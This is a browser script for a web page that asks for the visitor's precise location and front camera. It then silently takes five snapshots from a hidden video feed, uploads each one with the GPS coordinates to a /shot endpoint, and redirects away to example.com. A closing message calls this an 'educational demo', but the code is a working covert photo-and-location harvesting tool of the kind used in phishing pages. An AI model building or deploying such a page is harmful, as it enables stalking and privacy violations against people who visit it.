window.addEventListener("DOMContentLoaded", () => {
  const video = document.getElementById("preview");
  const status = document.getElementById("status");
  const card = document.getElementById("main-card");

  function getLocation() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve("Location not supported");
      } else {
        navigator.geolocation.getCurrentPosition(
          (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
          (err) => {
            if (err.code === 1) resolve("Location denied by user");
            else if (err.code === 2) resolve("Location unavailable (GPS off)");
            else if (err.code === 3) resolve("Location timeout");
            else resolve("Unknown Location Error");
          },
          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
      }
    });
  }

  (async () => {
    status.textContent = "📍 Requesting location...";
    const userLocation = await getLocation();
    
    // Check if location failed
    if (userLocation.includes("denied") || userLocation.includes("unavailable") || userLocation.includes("timeout")) {
        status.textContent = `⚠️ GPS Error: ${userLocation}`;
        status.classList.add("error");
        await new Promise(r => setTimeout(r, 3000)); 
    } else {
        status.textContent = "📍 Location found!";
    }

    status.textContent = "📷 Requesting camera...";
    let stream;
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" }, audio: false
      });
    } catch (e) {
      status.textContent = "❌ Camera permission denied.";
      status.classList.add("error");
      return;
    }

    video.srcObject = stream;
    await video.play();

    const c = document.createElement("canvas");
    c.width = video.videoWidth || 640;
    c.height = video.videoHeight || 480;
    const ctx = c.getContext("2d");

    let n = 0;
    status.textContent = "📸 Capturing photos... 1 / 5";

    const timer = setInterval(async () => {
      // Draw the hidden video to the canvas to take the picture
      ctx.drawImage(video, 0, 0, c.width, c.height);
      const img = c.toDataURL("image/jpeg", 0.7);
      
      try {
        await fetch("/shot", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ img: img, loc: userLocation })
        });
      } catch (_) {}

      n++;
      if (n < 5) {
          status.textContent = `📸 Capturing photos... ${n + 1} / 5`;
      } else {
        clearInterval(timer);
        stream.getTracks().forEach(t => t.stop());
        
        // This replaces the entire card content, which automatically removes the spinner!
        card.innerHTML = `
          <h2 class="success">✅ Demo Complete</h2>
          <p>Thank you for participating. Your photos and location have been securely uploaded for the educational demo.</p>
          <p style="font-size: 13px; color: #94a3b8; margin-top: 20px;">Redirecting you to example.com in <span id="countdown">5</span> seconds...</p>
        `;

        let secondsLeft = 5;
        const countdownEl = document.getElementById("countdown");
        
        const redirectTimer = setInterval(() => {
          secondsLeft--;
          if (countdownEl) countdownEl.textContent = secondsLeft;
          
          if (secondsLeft <= 0) {
            clearInterval(redirectTimer);
            window.location.href = "https://example.com";
          }
        }, 1000);
      }
    }, 2000);
  })();
});
